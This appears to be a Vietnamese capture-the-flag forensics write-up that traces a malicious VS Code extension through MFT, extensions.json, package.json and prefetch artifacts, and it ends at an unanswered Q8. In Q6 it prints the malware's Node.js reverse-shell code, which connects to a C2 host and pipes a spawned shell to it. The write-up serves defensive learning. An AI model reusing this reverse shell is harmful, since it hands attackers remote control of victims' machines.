Q1: ở bài này thì nạn nhân sẽ ko tải file mã độc qua trình duyệt mà sẽ qua VSCode, để tìm được file thì mình đọc file MFT, search thành với từ khóa `.vsix` (vsix là gói mở rộng của vscode)

khi mà tìm được rồi thì truy xem là nó được tải từ file nào

<img width="1015" height="36" alt="image" src="https://github.com/user-attachments/assets/e2712216-9475-421a-8185-52828808df9e" />


ngoài ra còn có thể tìm thấy trong powershell của user nerfjtron nha


<img width="789" height="112" alt="image" src="https://github.com/user-attachments/assets/3a624860-79c9-4799-ade9-d097ccb85fe2" />


Q2: để tìm thời gian tải extension này vào file extensions.json của vscode và truy ra số thời gian 

<img width="2158" height="178" alt="image" src="https://github.com/user-attachments/assets/e4572b50-c693-45ca-a386-8f08d642ed7c" />

sau đó lên `https://www.epochconverter.com/` để covert ra UTC

<img width="1018" height="220" alt="image" src="https://github.com/user-attachments/assets/116af061-15fb-46a9-9eb7-a1cc26f362c2" />

Q3: quay lại MFT, malware được đóng gói sẽ xảy ra trước khi nạn nhân tải file về và cài đặt vào máy (nghĩa là hacker đóng gói mã nguồn lẫn những extension cần thiết thành 1 packaged sau đó đợi tải về)

<img width="1864" height="42" alt="image" src="https://github.com/user-attachments/assets/636b8841-4598-4e31-a46e-3830e493ae2f" />


Q4: đọc trong folder extensions mã độc với file package.json

<img width="2136" height="109" alt="image" src="https://github.com/user-attachments/assets/3c5417c5-dfda-4ad3-92dc-68694bfc8aab" />


Q5: đọc tiếp trong file package.json, sợt chị gu gồ sẽ biết hàm khởi động của vscode

<img width="1189" height="247" alt="image" src="https://github.com/user-attachments/assets/50cc8a95-9677-4c14-ab70-27afc5a8a8ae" />


<img width="319" height="57" alt="image" src="https://github.com/user-attachments/assets/c9becae5-c95d-4cc9-a452-7987efd562b5" />

Q6: xem trong file extension.js sẽ tìm được class và C2 domain bị mã hóa bởi base64

<img width="958" height="423" alt="image" src="https://github.com/user-attachments/assets/99816e2d-f55b-4b19-a48b-db79fbefc5f5" />

<img width="1387" height="565" alt="image" src="https://github.com/user-attachments/assets/d0786753-e37e-41e6-a873-b336c3a22678" />

đây là Reverse shell

`
socket.connect(port, host, () => {
    const shell = this._getShell();

    const proc = spawn(shell.cmd, shell.args, {
        stdio: 'pipe',
        windowsHide: true,
        detached: false,
        shell: false
    });

    socket.pipe(proc.stdin);
    proc.stdout.pipe(socket);
    proc.stderr.pipe(socket);
});
`

| Đoạn mã | Hành vi |
|---|---|
| `socket.pipe(proc.stdin)` | Đưa dữ liệu nhận từ C2 vào shell để thực thi lệnh |
| `proc.stdout.pipe(socket)` | Gửi kết quả lệnh về C2 |
| `proc.stderr.pipe(socket)` | Gửi thông báo lỗi về C2 |


Q7: để biết file được héc cơ truy cập lần đầu mình sẽ xem trong thư mục `prefetch` với lệnh trong powershell: .\PECmd.exe -d 'E:\Evidence\C\Windows\Prefetch' --csv 'E:\Output\Prefetch'

<img width="1401" height="157" alt="image" src="https://github.com/user-attachments/assets/02243bab-0e24-441d-a7ba-42bd35715f89" />


Q8: 



















